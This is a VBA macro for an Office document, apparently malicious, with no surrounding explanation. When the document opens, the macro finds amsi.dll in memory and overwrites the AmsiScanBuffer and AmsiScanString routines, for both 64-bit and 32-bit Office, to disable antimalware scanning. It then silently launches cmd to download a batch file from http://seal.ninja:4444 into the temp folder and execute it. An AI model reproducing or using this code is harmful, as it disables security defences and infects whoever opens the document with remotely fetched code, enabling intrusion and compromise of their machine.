Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
 
Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
 
Private Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)
 
Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
 
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type
 
Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type
 
Const CREATE_NO_WINDOW = &H8000000
Const CREATE_NEW_CONSOLE = &H10
 
Function LoadDll(dll As String, func As String) As LongPtr
 
Dim AmsiDLL As LongPtr
 
AmsiDLL = LoadLibrary(dll)
LoadDll = GetProcAddress(AmsiDLL, func)
 
End Function
 
Function GetBuffer(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer) As String
 
Dim LeakedBytesBuffer As String
Dim LeakedByte As LongPtr
Dim TraverseStartAddr As LongPtr
 
On Error Resume Next
 
TraverseStartAddr = LeakedAmsiDllAddr - TraverseOffset
 
Dim i As Integer
For i = 0 To TraverseOffset
    Peek LeakedByte, ByVal (TraverseStartAddr + i), 1
 
    If LeakedByte < 16 Then
        FixedByteString = "0" & Hex(LeakedByte)
        LeakedBytesBuffer = LeakedBytesBuffer & FixedByteString
    Else
        LeakedBytesBuffer = LeakedBytesBuffer & Hex(LeakedByte)
    End If
Next i
 
GetBuffer = LeakedBytesBuffer
 
End Function
 
Function FindPatchOffset(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer, InstructionInStringOffset As Integer) As LongPtr
 
Dim memOffset As Integer
 
memOffset = (InstructionInStringOffset - 1) / 2
FindPatchOffset = (LeakedAmsiDllAddr - TraverseOffset) + memOffset
 
End Function
 
Sub x64_office()
 
Dim LeakedAmsiDllAddr As LongPtr
 
Dim ScanBufferMagicBytes As String
Dim ScanStringMagicBytes As String
Dim LeakedBytesBuffer As String
Dim AmsiScanBufferPatchAddr As LongPtr
Dim AmsiScanStringPatchAddr As LongPtr
Dim TrvOffset As Integer
 
Dim InstructionInStringOffset As Integer
Dim Success As Integer
 
ScanBufferMagicBytes = "4C8BDC49895B08"
ScanStringMagicBytes = "4883EC384533DB"
TrvOffset = 352
Success = 0
 
LeakedAmsiDllAddr = LoadDll("amsi.dll", "AmsiUacInitialize")
 
LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset)
 
InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)
If InstructionInStringOffset <> 0 Then
    AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
    Result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0)
    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val("&H" & "C3")
    Success = Success + 1
End If
 
 
InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)
If InstructionInStringOffset <> 0 Then
    AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
    Result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0)
    ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val("&H" & "C3")
    Success = Success + 1
End If
 
If Success = 2 Then
    Call CallMe
End If
 
End Sub
 
Sub x32_office()
 
Dim LeakedAmsiDllAddr As LongPtr
 
Dim ScanBufferMagicBytes As String
Dim ScanStringMagicBytes As String
Dim LeakedBytesBuffer As String
Dim AmsiScanBufferPatchAddr As LongPtr
Dim AmsiScanStringPatchAddr As LongPtr
Dim TrvOffset As Integer
 
Dim InstructionInStringOffset As Integer
Dim Success As Integer
 
ScanBufferMagicBytes = "8B450C85C0745A85DB"
ScanStringMagicBytes = "8B550C85D27434837D"
TrvOffset = 300
Success = 0
 
LeakedAmsiDllAddr = LoadDll("amsi.dll", "AmsiUacInitialize")
 
LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset)
 
InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)
If InstructionInStringOffset <> 0 Then
    AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
 
    Result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0)
    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val("&H" & "31")
    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 2), 1, Val("&H" & "C0")
    Success = Success + 1
End If
 
InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)
If InstructionInStringOffset <> 0 Then
    AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
 
    Result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0)
    ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val("&H" & "31")
    ByteSwapper ByVal (AmsiScanStringPatchAddr + 2), 1, Val("&H" & "D2")
    Success = Success + 1
End If
 
If Success = 2 Then
    Call CallMe
End If
 
End Sub
 
Sub document_open()
 
#If Win64 Then
    Call x64_office
#ElseIf Win32 Then
    Call x32_office
#End If
 
End Sub
 
Sub CallMe()
     
Dim pInfo As PROCESS_INFORMATION
Dim sInfo As STARTUPINFO
Dim sNull As String
Dim lSuccess As Long
Dim lRetValue As Long

lSuccess = CreateProcess(sNull, "cmd /c curl http://seal.ninja:4444/s/s.bat --output %tmp%\s.bat && %tmp%\s.bat", ByVal 0&, ByVal 0&, 1&, CREATE_NO_WINDOW, ByVal 0&, sNull, sInfo, pInfo)

lRetValue = CloseHandle(pInfo.hThread)
lRetValue = CloseHandle(pInfo.hProcess)
 
End Sub
